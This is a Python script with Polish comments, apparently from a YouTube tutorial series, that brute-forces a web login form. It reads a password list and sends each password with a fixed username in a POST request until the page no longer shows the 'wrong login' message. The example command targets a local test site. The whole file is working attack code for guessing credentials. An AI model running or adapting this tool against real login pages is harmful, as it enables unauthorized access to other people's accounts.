# --[cz. 1] --- https://www.youtube.com/watch?v=LLHVyHUxZzs
# --[cz. 2] --- https://www.youtube.com/watch?v=8QYDdTs-J9k
# --[cz. 3] --- https://www.youtube.com/watch?v=ej38uPNh62I

# SZUKANIE HASŁA ZA POMOCĄ METODY WYŚWIETLANIA STRONY WWW Z KOMUNIKATEM "BŁĘDNE LOGOWANIE"
# ADRES STRONY WWW -- ZAPYTANIE POST (STRONA Z BŁĘDEM LOGOWANIA)

# KOMENDA TERMINALOWA: python crackerPass.py http://localhost/polpiotech/logon.php pbodych passes.txt login?haslo "Nieprawidłowy login lub hasło!"


import sys
import os
from time import sleep
import requests
from termcolor import cprint, colored
import colorama
colorama.init


class Cracker():
    def __init__(self, url, file, login, params_names, fail_phrase):
        self.url = url
        self.fail = fail_phrase
        self.file_name = file
        if os.path.exists(file):
        # CZYTANIE LISTY HASEŁ Z PLIKU *.TXT:    
            self.passes = self.read_data(self.file_name)
            cprint('Data correctly loaded!', 'green')
            # print(self.passes)

            # STAŁY LOGIN:
            self.login = login
            if len(login) == 0:
                cprint('Login not specified!' 'red')
                sys.exit()

            # DANE DO WYSŁANIA (LOGIN / HASŁO):
            try:
                self.data = []
                for pas in self.passes:
                    self.data.append((params_names[0], self.login, params_names[1], pas))
                cprint('Data correctly prepared!', 'green')
                # print(self.data)

            except IndexError:
                cprint('Params names specified incorrectly!', 'red')
                sys.exit()

            # WYSYŁANIE DANYCH DO SERVERA:
            for index, single_data in enumerate(self.data):
                sleep(0.25)
                print(' '*100, end='\r') # WYŚWIETLANIE W JEDNEJ LINII.
                print(colored(f'[  {index+1}/{len(self.passes)}  ] Sending: {single_data} for {self.url}', 'yellow'), end='\r')
                if self.send(self.url, single_data, self.fail):
                    print('')
                    cprint('Password found!', 'green')
                    print('Login', colored(self.login, 'blue'))
                    print('Password:', colored(single_data[3], 'blue'))
                    ask = input('Do you want to continue scan? (Y/N): ')
                    if ask.upper() == 'N':
                        sys.exit()
            print('')
        else:
            cprint('File could not be found!', 'red')
            sys.exit()

    def read_data(self, filename):
        with open(filename, 'r') as f:
            lines = f.read().split('\n')
            return lines
        
    def send(self, url, data, fail):
        ready_data = {data[0]: data[1], data[2]: data[3]}
        r = requests.post(url=url, data=ready_data)
        if fail in r.text:
            return False
        else:
            return True

# OBSŁUGA ARGUMENTÓW PRZESŁANYCH Z KONSOLI:
try:
    URL = sys.argv[1]
    LOGIN = sys.argv[2]
    PASS_FILE = sys.argv[3]
    PARAMS_NAME = sys.argv[4].split('?')
    FAIL = sys.argv[5]
    cracker = Cracker(URL, PASS_FILE, LOGIN, (PARAMS_NAME[0] , PARAMS_NAME[1]), FAIL)
except IndexError:
    cprint('Usage: python crackerPass.py <url> <login> <pass_file> <params_names, seprated with "?"> <fail_phrase>', 'red')
    sys.exit()